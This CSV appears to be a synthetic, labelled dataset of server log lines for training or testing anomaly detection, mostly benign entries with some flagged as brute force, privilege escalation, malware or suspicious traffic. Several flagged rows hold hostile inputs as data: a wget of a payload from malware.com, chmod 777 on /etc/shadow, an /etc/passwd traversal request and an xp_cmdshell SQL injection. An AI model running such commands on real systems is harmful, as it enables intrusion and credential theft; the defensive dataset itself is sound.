timestamp,log_message,label,anomaly_type
2026-01-04 02:02:27,[INFO] Application started successfully,0,normal
2026-01-04 02:02:29,[DEBUG] Processing request from 192.168.19.157,0,normal
2026-01-04 02:02:33,Accepted password for user from 192.168.248.24 port 15111 ssh2,0,normal
2026-01-04 02:02:38,[DEBUG] Processing request from 192.168.232.38,0,normal
2026-01-04 02:02:45,session closed for user nginx,0,normal
2026-01-04 02:03:17,"192.168.234.47 - - [04/Jan/2026:01:06:21 +0700] ""GET / HTTP/1.1"" 304 0",0,normal
2026-01-04 02:03:23,session closed for user nginx,0,normal
2026-01-04 02:03:25,Accepted password for nginx from 192.168.189.104 port 7798 ssh2,0,normal
2026-01-04 02:03:26,"192.168.3.23 - - [04/Jan/2026:00:31:45 +0700] ""GET /api/v1/data HTTP/1.1"" 200 19931",0,normal
2026-01-04 02:03:34,[INFO] Request processed in 81ms,0,normal
2026-01-04 02:03:43,session closed for user admin,0,normal
2026-01-04 02:04:00,"192.168.181.206 - - [04/Jan/2026:08:08:05 +0700] ""GET /admin HTTP/1.1"" 200 5412",0,normal
2026-01-04 02:04:06,kernel: [488.684745] br-0: link up,0,normal
2026-01-04 02:04:20,Accepted password for postgres from 192.168.172.241 port 54868 ssh2,0,normal
2026-01-04 02:04:30,[INFO] Cache hit for key: cache_key_830,0,normal
2026-01-04 02:04:50,systemd[1]: Started redis.service,0,normal
2026-01-04 02:04:51,[INFO] Application started successfully,0,normal
2026-01-04 02:05:03,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:05:27,MySQL server started with process id 47821,0,normal
2026-01-04 02:05:45,kernel: [107.520149] eth0: link down,0,normal
2026-01-04 02:05:46,[INFO] Application started successfully,0,normal
2026-01-04 02:06:01,[INFO] Request processed in 1687ms,0,normal
2026-01-04 02:06:08,Connection received: host=192.168.223.213 user=mysql database=analytics,0,normal
2026-01-04 02:06:31,"192.168.228.67 - - [03/Jan/2026:18:52:36 +0700] ""GET /dashboard HTTP/1.1"" 200 31656",0,normal
2026-01-04 02:06:53,session opened for user root by (uid=0),0,normal
2026-01-04 02:06:54,systemd[1]: Starting redis.service...,0,normal
2026-01-04 02:07:01,Received disconnect from 192.168.222.132 port 55086:11: disconnected by user,0,normal
2026-01-04 02:07:03,Received disconnect from 192.168.203.187 port 23076:11: disconnected by user,0,normal
2026-01-04 02:07:05,MySQL server started with process id 7244,0,normal
2026-01-04 02:07:19,kernel: [23.885039] br-0: link down,0,normal
2026-01-04 02:07:21,Connection received: host=192.168.113.104 user=postgres database=production,0,normal
2026-01-04 02:07:45,MySQL server started with process id 30806,0,normal
2026-01-04 02:07:45,kernel: [393.767816] eth1: link up,0,normal
2026-01-04 02:08:11,Connection received: host=192.168.125.225 user=guest database=staging,0,normal
2026-01-04 02:08:19,[INFO] User root logged in successfully,0,normal
2026-01-04 02:08:20,Received disconnect from 192.168.21.35 port 48679:11: disconnected by user,0,normal
2026-01-04 02:08:23,systemd[1]: Starting cron.service...,0,normal
2026-01-04 02:08:28,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 02:08:29,systemd[1]: Started ssh.service,0,normal
2026-01-04 02:09:08,kernel: [507.992288] docker0: link up,0,normal
2026-01-04 02:09:11,ALERT: Suspicious process detected: keylogger (PID: 36160),1,malware_indicator
2026-01-04 02:09:16,Connection received: host=192.168.234.110 user=admin database=analytics,0,normal
2026-01-04 02:09:25,[INFO] User mysql logged in successfully,0,normal
2026-01-04 02:09:28,systemd[1]: Started mysql.service,0,normal
2026-01-04 02:09:28,"192.168.113.208 - - [04/Jan/2026:07:21:06 +0700] ""POST /api/v1/users HTTP/1.1"" 200 21246",0,normal
2026-01-04 02:09:28,[INFO] Cache hit for key: cache_key_189,0,normal
2026-01-04 02:09:29,[INFO] Application started successfully,0,normal
2026-01-04 02:09:31,kernel: [821.870855] eth0: link down,0,normal
2026-01-04 02:09:38,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 02:09:45,"192.168.39.153 - - [04/Jan/2026:09:13:22 +0700] ""POST /api/v1/data HTTP/1.1"" 200 31439",0,normal
2026-01-04 02:10:19,systemd[1]: Stopped cron.service,0,normal
2026-01-04 02:10:46,[INFO] Request processed in 879ms,0,normal
2026-01-04 02:10:55,error: maximum authentication attempts exceeded for www-data from 192.42.96.112,1,brute_force
2026-01-04 02:10:57,kernel: [13.826909] wlan0: link down,0,normal
2026-01-04 02:11:06,kernel: [257.964517] br-0: link up,0,normal
2026-01-04 02:11:22,[DEBUG] Processing request from 192.168.214.205,0,normal
2026-01-04 02:11:27,session opened for user root by (uid=0),0,normal
2026-01-04 02:11:30,[INFO] Cache hit for key: cache_key_365,0,normal
2026-01-04 02:11:32,Received disconnect from 192.168.84.170 port 20399:11: disconnected by user,0,normal
2026-01-04 02:11:34,kernel: [548.215529] eth0: link down,0,normal
2026-01-04 02:11:49,"192.168.240.241 - - [03/Jan/2026:17:07:30 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-04 02:11:53,[INFO] Cache hit for key: cache_key_405,0,normal
2026-01-04 02:12:06,Received disconnect from 192.168.140.198 port 6028:11: disconnected by user,0,normal
2026-01-04 02:12:39,session closed for user apache,0,normal
2026-01-04 02:12:49,Received disconnect from 192.168.169.228 port 42746:11: disconnected by user,0,normal
2026-01-04 02:13:06,[INFO] Application started successfully,0,normal
2026-01-04 02:13:12,session opened for user apache by (uid=0),0,normal
2026-01-04 02:13:12,session opened for user guest by (uid=0),0,normal
2026-01-04 02:13:20,session closed for user user,0,normal
2026-01-04 02:13:22,[INFO] Request processed in 2901ms,0,normal
2026-01-04 02:13:29,"192.168.102.179 - - [03/Jan/2026:17:46:56 +0700] ""GET /static/js/app.js HTTP/1.1"" 200 36257",0,normal
2026-01-04 02:13:44,Received disconnect from 192.168.39.113 port 26017:11: disconnected by user,0,normal
2026-01-04 02:13:57,MySQL server started with process id 4030,0,normal
2026-01-04 02:14:31,MySQL server started with process id 56248,0,normal
2026-01-04 02:14:43,[INFO] User nginx logged in successfully,0,normal
2026-01-04 02:14:46,"192.168.28.95 - - [04/Jan/2026:00:03:14 +0700] ""GET / HTTP/1.1"" 304 0",0,normal
2026-01-04 02:14:48,[INFO] Cache hit for key: cache_key_852,0,normal
2026-01-04 02:15:06,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 02:15:28,systemd[1]: Started apache2.service,0,normal
2026-01-04 02:15:35,Received disconnect from 192.168.132.250 port 23701:11: disconnected by user,0,normal
2026-01-04 02:15:38,systemd[1]: Started apache2.service,0,normal
2026-01-04 02:15:48,www-data: user NOT in sudoers; TTY=pts/0; PWD=/home/www-data; USER=root; COMMAND=/bin/bash,1,privilege_escalation
2026-01-04 02:16:11,Accepted password for user from 192.168.227.166 port 56219 ssh2,0,normal
2026-01-04 02:16:17,[INFO] Request processed in 2524ms,0,normal
2026-01-04 02:16:24,[INFO] Request processed in 1472ms,0,normal
2026-01-04 02:16:29,session opened for user www-data by (uid=0),0,normal
2026-01-04 02:16:49,kernel: [891.241210] wlan0: link down,0,normal
2026-01-04 02:17:00,Accepted password for guest from 192.168.124.128 port 33296 ssh2,0,normal
2026-01-04 02:17:23,authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.26.87,1,brute_force
2026-01-04 02:17:46,DDoS attack detected from 104.248.134.183 - rate limit exceeded,1,suspicious_network
2026-01-04 02:17:48,"kernel: [301.516328] I/O error, dev wlan0, sector 2094061",1,system_error
2026-01-04 02:17:54,kernel: [164.604275] wlan0: link up,0,normal
2026-01-04 02:17:59,"192.168.24.125 - - [03/Jan/2026:18:37:14 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 02:18:10,session opened for user mysql by (uid=0),0,normal
2026-01-04 02:18:16,[INFO] Request processed in 2132ms,0,normal
2026-01-04 02:18:32,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 02:18:34,[DEBUG] Processing request from 192.168.28.35,0,normal
2026-01-04 02:18:50,"192.168.237.245 - - [04/Jan/2026:05:31:03 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 02:18:59,systemd[1]: Starting postgresql.service...,0,normal
2026-01-04 02:19:01,"192.168.51.13 - - [04/Jan/2026:01:59:09 +0700] ""POST / HTTP/1.1"" 200 18084",0,normal
2026-01-04 02:19:07,kernel: [992.294795] eth1: link down,0,normal
2026-01-04 02:19:24,[INFO] Request processed in 1535ms,0,normal
2026-01-04 02:19:41,session opened for user apache by (uid=0),0,normal
2026-01-04 02:19:43,[INFO] Application started successfully,0,normal
2026-01-04 02:19:50,kernel: [352.839928] eth1: link up,0,normal
2026-01-04 02:19:54,session closed for user www-data,0,normal
2026-01-04 02:20:10,systemd[1]: Starting mongodb.service...,0,normal
2026-01-04 02:20:30,Connection received: host=192.168.96.106 user=mysql database=staging,0,normal
2026-01-04 02:20:32,Accepted password for root from 192.168.236.182 port 62705 ssh2,0,normal
2026-01-04 02:20:41,kernel: [514.637700] wlan0: link down,0,normal
2026-01-04 02:20:51,[INFO] Application started successfully,0,normal
2026-01-04 02:20:52,MySQL server started with process id 38314,0,normal
2026-01-04 02:20:52,kernel: [996.221023] wlan0: link down,0,normal
2026-01-04 02:20:57,[DEBUG] Processing request from 192.168.15.152,0,normal
2026-01-04 02:21:03,ALERT: Suspicious process detected: botnet_client (PID: 6186),1,malware_indicator
2026-01-04 02:21:03,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 02:21:08,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 02:21:09,systemd[1]: Started apache2.service,0,normal
2026-01-04 02:21:11,"192.168.219.136 - - [04/Jan/2026:08:35:43 +0700] ""POST /api/v1/data HTTP/1.1"" 200 35188",0,normal
2026-01-04 02:21:18,[INFO] Application started successfully,0,normal
2026-01-04 02:21:20,[INFO] Application started successfully,0,normal
2026-01-04 02:21:26,kernel: [500.695300] docker0: link up,0,normal
2026-01-04 02:21:33,ALERT: Rootkit signature detected in /dashboard,1,malware_indicator
2026-01-04 02:21:36,[INFO] Cache hit for key: cache_key_889,0,normal
2026-01-04 02:21:40,"192.168.24.119 - - [04/Jan/2026:13:05:19 +0700] ""GET /dashboard HTTP/1.1"" 200 20356",0,normal
2026-01-04 02:21:59,[DEBUG] Processing request from 192.168.16.67,0,normal
2026-01-04 02:22:23,Received disconnect from 192.168.105.107 port 48687:11: disconnected by user,0,normal
2026-01-04 02:22:27,kernel: [7.576879] br-0: link down,0,normal
2026-01-04 02:22:28,"185.220.219.208 - - [03/Jan/2026:19:36:51 +0700] ""GET /admin HTTP/1.1"" 403 24038",1,suspicious_network
2026-01-04 02:22:29,[INFO] Cache hit for key: cache_key_959,0,normal
2026-01-04 02:22:32,Received disconnect from 192.168.107.85 port 58989:11: disconnected by user,0,normal
2026-01-04 02:22:44,Received disconnect from 192.168.95.252 port 62881:11: disconnected by user,0,normal
2026-01-04 02:23:17,session opened for user guest by (uid=0),0,normal
2026-01-04 02:23:23,kernel: [833.940216] docker0: link up,0,normal
2026-01-04 02:23:42,Connection received: host=192.168.166.42 user=postgres database=analytics,0,normal
2026-01-04 02:24:05,sudo: www-data : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=chmod 777 /etc/shadow,1,privilege_escalation
2026-01-04 02:24:06,MySQL server started with process id 58978,0,normal
2026-01-04 02:24:18,kernel: [119.962466] eth0: link up,0,normal
2026-01-04 02:24:26,"192.168.138.37 - - [04/Jan/2026:01:52:30 +0700] ""GET /api/v1/data HTTP/1.1"" 200 40390",0,normal
2026-01-04 02:24:46,[INFO] Cache hit for key: cache_key_385,0,normal
2026-01-04 02:24:58,[INFO] User nginx logged in successfully,0,normal
2026-01-04 02:25:07,[DEBUG] Processing request from 192.168.212.201,0,normal
2026-01-04 02:25:08,MySQL server started with process id 20712,0,normal
2026-01-04 02:25:13,[DEBUG] Processing request from 192.168.162.20,0,normal
2026-01-04 02:25:23,"192.168.26.28 - - [04/Jan/2026:08:48:13 +0700] ""GET /login HTTP/1.1"" 200 9927",0,normal
2026-01-04 02:25:24,Received disconnect from 192.168.224.151 port 44835:11: disconnected by user,0,normal
2026-01-04 02:25:24,"192.168.222.252 - - [04/Jan/2026:07:14:49 +0700] ""GET / HTTP/1.1"" 200 339",0,normal
2026-01-04 02:25:39,[INFO] Application started successfully,0,normal
2026-01-04 02:26:02,sudo: root : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=wget http://malware.com/payload,1,privilege_escalation
2026-01-04 02:26:09,kernel: [838.488396] eth0: link down,0,normal
2026-01-04 02:26:09,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 02:26:10,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:26:17,"192.168.147.91 - - [03/Jan/2026:13:59:46 +0700] ""GET /dashboard HTTP/1.1"" 200 6654",0,normal
2026-01-04 02:26:28,"192.168.172.155 - - [04/Jan/2026:04:43:48 +0700] ""GET /css/style.css HTTP/1.1"" 200 30085",0,normal
2026-01-04 02:26:29,DDoS attack detected from 104.248.67.133 - rate limit exceeded,1,suspicious_network
2026-01-04 02:26:34,[INFO] Cache hit for key: cache_key_608,0,normal
2026-01-04 02:26:34,Received disconnect from 192.168.148.54 port 62545:11: disconnected by user,0,normal
2026-01-04 02:26:36,[INFO] Cache hit for key: cache_key_706,0,normal
2026-01-04 02:27:14,[INFO] Application started successfully,0,normal
2026-01-04 02:27:34,session closed for user guest,0,normal
2026-01-04 02:27:50,session closed for user user,0,normal
2026-01-04 02:28:05,systemd[1]: Started postgresql.service,0,normal
2026-01-04 02:28:15,Accepted password for postgres from 192.168.136.51 port 61589 ssh2,0,normal
2026-01-04 02:28:16,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:28:18,[INFO] User root logged in successfully,0,normal
2026-01-04 02:28:33,"192.42.119.101 - - [04/Jan/2026:12:52:20 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 38603",1,suspicious_network
2026-01-04 02:28:36,kernel: [244.404994] wlan0: link down,0,normal
2026-01-04 02:28:41,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 02:28:44,Accepted password for mysql from 192.168.61.125 port 54154 ssh2,0,normal
2026-01-04 02:28:53,session opened for user user by (uid=0),0,normal
2026-01-04 02:29:02,[INFO] User guest logged in successfully,0,normal
2026-01-04 02:29:02,[DEBUG] Processing request from 192.168.153.51,0,normal
2026-01-04 02:29:22,[INFO] Request processed in 2604ms,0,normal
2026-01-04 02:29:41,kernel: [158.494197] br-0: link down,0,normal
2026-01-04 02:29:41,MySQL server started with process id 30943,0,normal
2026-01-04 02:29:51,[INFO] Request processed in 697ms,0,normal
2026-01-04 02:29:56,[DEBUG] Processing request from 192.168.15.131,0,normal
2026-01-04 02:30:15,"192.168.12.20 - - [03/Jan/2026:16:56:13 +0700] ""POST /images/logo.png HTTP/1.1"" 200 4708",0,normal
2026-01-04 02:30:20,session opened for user mysql by (uid=0),0,normal
2026-01-04 02:30:30,kernel: [757.490748] eth0: link down,0,normal
2026-01-04 02:30:49,MySQL server started with process id 1467,0,normal
2026-01-04 02:30:55,guest: user NOT in sudoers; TTY=pts/0; PWD=/home/guest; USER=root; COMMAND=/bin/bash,1,privilege_escalation
2026-01-04 02:31:01,session opened for user apache by (uid=0),0,normal
2026-01-04 02:31:13,Received disconnect from 192.168.84.103 port 27983:11: disconnected by user,0,normal
2026-01-04 02:31:14,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:31:15,[INFO] User mysql logged in successfully,0,normal
2026-01-04 02:31:20,[INFO] User guest logged in successfully,0,normal
2026-01-04 02:31:45,[DEBUG] Processing request from 192.168.102.242,0,normal
2026-01-04 02:32:11,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 02:32:21,Possible SQL injection attack from 104.248.208.238: 1; EXEC xp_cmdshell,1,suspicious_network
2026-01-04 02:32:35,"192.168.178.42 - - [04/Jan/2026:09:29:30 +0700] ""POST /static/js/app.js HTTP/1.1"" 200 14615",0,normal
2026-01-04 02:32:48,session closed for user root,0,normal
2026-01-04 02:33:11,session opened for user apache by (uid=0),0,normal
2026-01-04 02:33:24,"192.168.182.111 - - [03/Jan/2026:14:50:24 +0700] ""GET /index.html HTTP/1.1"" 304 0",0,normal
2026-01-04 02:33:25,kernel: [570.710340] br-0: link up,0,normal
2026-01-04 02:33:37,Received disconnect from 192.168.16.206 port 38740:11: disconnected by user,0,normal
2026-01-04 02:33:51,session opened for user root by (uid=0),0,normal
2026-01-04 02:34:01,[INFO] Application started successfully,0,normal
2026-01-04 02:34:40,[INFO] Application started successfully,0,normal
2026-01-04 02:34:43,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 02:34:52,Received disconnect from 192.168.220.37 port 33561:11: disconnected by user,0,normal
2026-01-04 02:34:54,kernel: [887.234921] wlan0: link down,0,normal
2026-01-04 02:35:16,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:35:22,kernel: [191.278245] wlan0: link up,0,normal
2026-01-04 02:35:46,"192.168.62.41 - - [04/Jan/2026:12:17:05 +0700] ""POST /login HTTP/1.1"" 200 31902",0,normal
2026-01-04 02:35:47,[INFO] User user logged in successfully,0,normal
2026-01-04 02:35:58,DDoS attack detected from 192.42.179.116 - rate limit exceeded,1,suspicious_network
2026-01-04 02:36:16,[INFO] User www-data logged in successfully,0,normal
2026-01-04 02:36:18,kernel: [301.673378] br-0: link up,0,normal
2026-01-04 02:36:19,systemd[1]: Started mongodb.service,0,normal
2026-01-04 02:36:31,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 02:36:33,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:36:38,[INFO] Cache hit for key: cache_key_216,0,normal
2026-01-04 02:36:40,[ERROR] Memory allocation failed for request from 104.248.110.36,1,system_error
2026-01-04 02:36:49,"192.168.185.26 - - [03/Jan/2026:21:52:34 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-04 02:36:52,session closed for user admin,0,normal
2026-01-04 02:36:57,ALERT: Rootkit signature detected in /index.html,1,malware_indicator
2026-01-04 02:37:03,"192.168.161.244 - - [03/Jan/2026:14:49:00 +0700] ""GET / HTTP/1.1"" 200 2382",0,normal
2026-01-04 02:37:06,Connection received: host=192.168.167.39 user=admin database=production,0,normal
